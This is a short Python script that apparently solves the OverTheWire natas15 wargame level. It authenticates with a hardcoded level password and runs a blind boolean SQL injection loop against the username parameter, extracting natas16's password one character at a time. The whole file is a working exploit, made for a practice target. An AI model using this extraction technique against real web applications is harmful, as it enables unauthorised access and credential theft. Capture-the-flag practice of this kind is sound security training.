#!/usr/bin/python

import os, socket, sys, re, urllib2

charSet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
pwLength = 32

passman = urllib2.HTTPPasswordMgr()
passman.add_password("Authentication required","http://natas15.natas.labs.overthewire.org/", "natas15", "m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV")
auth = urllib2.HTTPBasicAuthHandler(passman)
opener = urllib2.build_opener(auth)
urllib2.install_opener(opener)

#use RE for "This user doesn't exist." or "This user exists."
i=0
flag = ""

#loop over password length
while i < pwLength:
	i+=1
	
	#loop url over character set
	for char in charSet:
		#print "Retrieving: " + char + " for index: " + str(i)
		url = "http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20and%20BINARY%20%22"+char+"%22=substr(password,"+str(i)+",1)%20and%20%221%22=%221"
		page = urllib2.urlopen(url)
		resp = page.read()
		match = re.search(r'exists.', resp)
		if match: 
			flag += char
			print flag
			break